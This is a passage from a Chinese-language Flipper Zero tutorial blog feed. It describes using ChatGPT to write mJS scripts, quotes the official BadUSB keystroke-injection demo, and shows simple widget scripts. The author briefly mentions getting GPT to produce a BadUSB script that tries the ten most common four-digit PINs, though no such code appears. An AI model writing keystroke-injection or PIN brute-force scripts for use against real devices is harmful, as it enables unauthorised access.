--channel=dev</span><br></pre></td></tr></table></figure></div><p>這邊載 dev 是因為他有比較多安全保護機制，可以幫我們提前識別某些錯誤，像是 <code>furi_assert</code>，他會幫我我們在程式有問題的時候讓他停下來。<br>然後既然我們用 dev 版本的官方韌體來開發，我們 Flipper 肯定也是要用開發版的韌體，所以這邊用 qFlipper 安裝。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dev_firm.jpg"                      alt="dev"                ></p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>這個開發的內容可能會持續三到五天，所以這幾天會一步步把我們的 “Dolzma Power Coach” 給開發出來，包含畫圖那些，希望最後可以有一個完整的成品放到 Flipper App Store，那今天就先到這邊，各位明天見！</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://www.reddit.com/r/flipperzero/comments/13a38wy/a_short_tutorial_for_firsttime_flipper_app/" >https://www.reddit.com/r/flipperzero/comments/13a38wy/a_short_tutorial_for_firsttime_flipper_app/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li><li><a class="link"   href="https://instantiator.dev/post/flipper-zero-app-tutorial-01/" >https://instantiator.dev/post/flipper-zero-app-tutorial-01/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Cover&quot;&gt;&lt;a href=&quot;#Cover&quot; class=&quot;headerlink&quot; title=&quot;Cover&quot;&gt;&lt;/a&gt;Cover&lt;/h2&gt;&lt;p&gt;&lt;img  
                     lazyload
                     </summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero 宇宙最強攻略：30 天帶你從入門到入坑 Day25 - 基於生成式預訓練模型之 mJS 腳本開發：探討 ChatGPT 在 Flipper Zero 自動化中的應用</title>
    <link href="https://kazma.tw/2024/10/09/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day25/"/>
    <id>https://kazma.tw/2024/10/09/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day25/</id>
    <published>2024-10-09T14:20:49.032Z</published>
    <updated>2024-10-27T09:33:47.227Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今年 9 月 10 號的時候，我看到 Flipper 官網發了一篇部落格是關於他們的韌體終於進入 1.0 版本了，也列出目前的版有的標誌性功能：<br><a class="link"   href="https://blog.flipper.net/released-firmware-1/" >Firmware 1.0 Released <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://blog.flipper.net/content/images/size/w1600/2024/09/Flipper_Zero_Firmware_1.0_whats_new_02--1-.png"                      alt="blog"                ><br>圖片來源：<a class="link"   href="https://blog.flipper.net/released-firmware-1/" >https://blog.flipper.net/released-firmware-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>其中讓我比較感興趣的是發現他可以執行 JaveScript，於是就嘗試寫了一個簡單的 hello.js 嘗是在螢幕上印出 “Hello World”，如下：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// helloWorld.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello World&quot;</span>);</span><br></pre></td></tr></table></figure></div><p>但後來卻失敗了，也沒找到時間繼續嘗試，結果這幾天在 YT 看到 Derek Jamison 有一集是關於他訓練 GPT 去撰寫 Flipper 可以執行的 JS，於是有了今天的內容。<br>影片網址：<a class="link"   href="https://youtu.be/5U26CU_j2tE?si=P1PENjpoujiw_-TA" >https://youtu.be/5U26CU_j2tE?si=P1PENjpoujiw_-TA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="資安倫理宣導"><a href="#資安倫理宣導" class="headerlink" title="資安倫理宣導"></a>資安倫理宣導</h2><p>請注意，透過 Flipper Zero 學習的資訊技術與知識，目的在於提升個人的技術能力和資安意識。我們強烈呼籲大家，絕對不要使用所學知識從事任何違法行為。您的合法使用是我們的期望，也是您自身責任的<br>一部分。</p><h2 id="JavaScript-on-Flipper-Zero"><a href="#JavaScript-on-Flipper-Zero" class="headerlink" title="JavaScript on Flipper Zero"></a>JavaScript on Flipper Zero</h2><p>在剛剛提到的官方更新文章中，只有看到一段介紹：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="https://blog.flipper.net/content/images/size/w1600/2024/09/Flipper_Zero_JavaScript_support_new.png"                      alt="copy"                ><br>圖片來源：<a class="link"   href="https://blog.flipper.net/released-firmware-1/" >https://blog.flipper.net/released-firmware-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><blockquote><p>JavaScript support is based on the mJS scripting engine. Originally designed for microcontrollers, mJS utilizes system resources efficiently and operates relatively quickly. It requires less than 50k of flash space and 2k of RAM.</p></blockquote><p>前面有提到 script 資料夾下面有 examples 以及上面這段敘述有提到 Flipper 用的是 mJS，一種針對微控制器的腳本引擎，對系統資源的利用即為高效，執行速度也相對快。<br>簡單來說 mJS 就是很輕的 JS，特別適合 Flipper 這種記憶體和處理能力有限的裝置使用。</p><p>範例中包括像是 <code>basusb_demo.js</code>:</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> badusb = <span class="built_in">require</span>(<span class="string">&quot;badusb&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> notify = <span class="built_in">require</span>(<span class="string">&quot;notification&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> flipper = <span class="built_in">require</span>(<span class="string">&quot;flipper&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> dialog = <span class="built_in">require</span>(<span class="string">&quot;dialog&quot;</span>);</span><br><span class="line"></span><br><span class="line">badusb.<span class="title function_">setup</span>(&#123;</span><br><span class="line">    <span class="attr">vid</span>: <span class="number">0xAAAA</span>,</span><br><span class="line">    <span class="attr">pid</span>: <span class="number">0xBBBB</span>,</span><br><span class="line">    <span class="attr">mfr_name</span>: <span class="string">&quot;Flipper&quot;</span>,</span><br><span class="line">    <span class="attr">prod_name</span>: <span class="string">&quot;Zero&quot;</span>,</span><br><span class="line">    <span class="attr">layout_path</span>: <span class="string">&quot;/ext/badusb/assets/layouts/en-US.kl&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line">dialog.<span class="title function_">message</span>(<span class="string">&quot;BadUSB demo&quot;</span>, <span class="string">&quot;Press OK to start&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (badusb.<span class="title function_">isConnected</span>()) &#123;</span><br><span class="line">    notify.<span class="title function_">blink</span>(<span class="string">&quot;green&quot;</span>, <span class="string">&quot;short&quot;</span>);</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;USB is connected&quot;</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;DOWN&quot;</span>);</span><br><span class="line">    <span class="title function_">delay</span>(<span class="number">1000</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">    <span class="title function_">delay</span>(<span class="number">1000</span>);</span><br><span class="line">    badusb.<span class="title function_">press</span>(<span class="string">&quot;CTRL&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;1234&quot;</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Flipper Model: &quot;</span> + flipper.<span class="title function_">getModel</span>());</span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Flipper Name: &quot;</span> + flipper.<span class="title function_">getName</span>());</span><br><span class="line">    badusb.<span class="title function_">println</span>(<span class="string">&quot;Battery level: &quot;</span> + <span class="title function_">to_string</span>(flipper.<span class="title function_">getBatteryCharge</span>()) + <span class="string">&quot;%&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Alt+Numpad method works only on Windows!!!</span></span><br><span class="line">    badusb.<span class="title function_">altPrintln</span>(<span class="string">&quot;This was printed with Alt+Numpad method!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// There&#x27;s also badusb.print() and badusb.altPrint()</span></span><br><span class="line">    <span class="comment">// which don&#x27;t add the return at the end</span></span><br><span class="line"></span><br><span class="line">    notify.<span class="title function_">success</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&quot;USB not connected&quot;</span>);</span><br><span class="line">    notify.<span class="title function_">error</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Optional, but allows to interchange with usbdisk</span></span><br><span class="line">badusb.<span class="title function_">quit</span>();</span><br></pre></td></tr></table></figure></div><p>總之就是跟一般的 JS 有一點差距，於是我們如果想用 ai 幫我寫一些 Flipper 能夠執行的腳本的話，需要先進行訓練。</p><h2 id="Train"><a href="#Train" class="headerlink" title="Train"></a>Train</h2><p>其中 Derek 提供了一個他做的 GitHub Repo 可以幫助我們訓練 GPT 其中包含一段 intro.txt 以及三個 train.js，用法就是把 train.js 都丟給 GPT 然後放上 intro.txt 的描述後加上我們的需求例如下面的方式放上去：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/train.png"                      alt="train"                ><br>其中 <code>intro.txt</code> 的內容如下：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Flipper Zero JavaScript is based on the mJS engine, which is fairly restricted.  For example:</span><br><span class="line">- You must use the `let` keyword.  `const` and `var` are not allowed.</span><br><span class="line">- You cannot do string interpolation with the `$`.</span><br><span class="line">- You must use `let Math = require(&quot;math&quot;);` if you need access to any of the Math functions.</span><br><span class="line">- You must use `to_string` to convert numerics (like integer and float) into a string.</span><br><span class="line">- When keyboard.text display the on-screen keyboard, it covers the entire screen (so you can&#x27;t see any previously printed information).</span><br><span class="line">- All files are stored on the SD Card under the `/ext/` subdirectory.</span><br><span class="line">- Delays are always measured in milliseconds and use the built-in `delay` function.</span><br><span class="line">- Uint8Array(buffer) instead of `new Uint8Array(buffer)`.  Objects like `String` do not exist.  See arraybuf_to_string for code that should be used when converting a buffer into a string.</span><br><span class="line">- There is no split or trim functions build in for strings.  &quot;1,2&quot;.split(&quot;,&quot;); and &quot;x  &quot;.trim(); will generate runtime errors.</span><br><span class="line">- See the training file for how to use the to_upper_case, to_lower_case, parse_int.  You can get the ascii value of a character in a string using charCodeAt and also convert an ascii value back to a char using chr; see training file for details.</span><br><span class="line">- Console.log prints to the serial port debugger, as an [I]nfo.  Console.error prints to the serial port debugger, as an [E]rror.  The print method writes to the Flipper display.</span><br><span class="line">- Functions must be declared before they are used, but typically after all of the require statements.</span><br><span class="line"></span><br><span class="line">Attached are three sample JavaScript files that work on the Flipper Zero.</span><br><span class="line"></span><br><span class="line">You should only use functions defined in the training file, no additional built-in commands are supported.  You should not redefine any function that is used in the training file.</span><br></pre></td></tr></table></figure></div><p>在失敗幾次後，終於成功，他給我的檔案如下：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> widget = <span class="built_in">require</span>(<span class="string">&quot;widget&quot;</span>);</span><br><span class="line"></span><br><span class="line">widget.<span class="title function_">show</span>();</span><br><span class="line">widget.<span class="title function_">addText</span>(<span class="number">10</span>, <span class="number">10</span>, <span class="string">&quot;Primary&quot;</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// This line is optional; it keeps the widget open for 10 seconds.</span></span><br><span class="line"><span class="title function_">delay</span>(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close the widget after showing the message.</span></span><br><span class="line">widget.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure></div><p>執行結果：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/hello_from_flipper.png"                      alt="hello"                ></p><p>成功！！<br>接著我們給他新任務，試著讀入使用者輸入：<br>mission: can you prompt for the name of the person then print “Hello <name>!”</p><p>GPT 4o:</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> widget = <span class="built_in">require</span>(<span class="string">&quot;widget&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> keyboard = <span class="built_in">require</span>(<span class="string">&quot;keyboard&quot;</span>);</span><br><span class="line"></span><br><span class="line">widget.<span class="title function_">show</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display on-screen keyboard to get user input</span></span><br><span class="line"><span class="keyword">let</span> name = keyboard.<span class="title function_">text</span>(<span class="string">&quot;Enter your name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Display the &quot;Hello &lt;name&gt;!&quot; message on the screen</span></span><br><span class="line">widget.<span class="title function_">addText</span>(<span class="number">10</span>, <span class="number">10</span>, <span class="string">&quot;Primary&quot;</span>, <span class="string">&quot;Hello &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Keep the widget open for 10 seconds</span></span><br><span class="line"><span class="title function_">delay</span>(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Close the widget after showing the message</span></span><br><span class="line">widget.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure></div><p>結果如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/error.png"                      alt="error"                ></p><p>結果大概重新試了十次還是一直遇到錯誤，好爛QQ<br>接著我們試著讓他寫一個 BasUSB 的腳本讓他去測試十個最常見的四位數 pin 碼：<br>結果是他還是會寫出許多錯誤，需要我們跟 GPT 來回 debug 3 ~ 5 次才會成功。</p><h2 id="按讚訂閱收藏小鈴噹叮叮叮"><a href="#按讚訂閱收藏小鈴噹叮叮叮" class="headerlink" title="按讚訂閱收藏小鈴噹叮叮叮"></a>按讚訂閱收藏小鈴噹叮叮叮</h2><p>結論是 mJS 沒有想像中的方便，因為他其實不像是我們常用的 JS，如果透過 AI 協助的話確實會比較有效率，但還是需要先訓練而且經過多次 Debug 才有機會拿到可以執行的腳本。<br>今天的介紹就到這邊，這幾天準備開始寫 Flipper 的 APP 不知道大家有沒有什麼有趣的想法，歡迎留言告訴我。<br>明天見！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在今年 9 月 10 號的時候，我看到 Flipper 官網發了一篇部落格是關於他們的韌體終於進入 1.0 版本了，也列出目前的版有的標誌性</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
</feed>
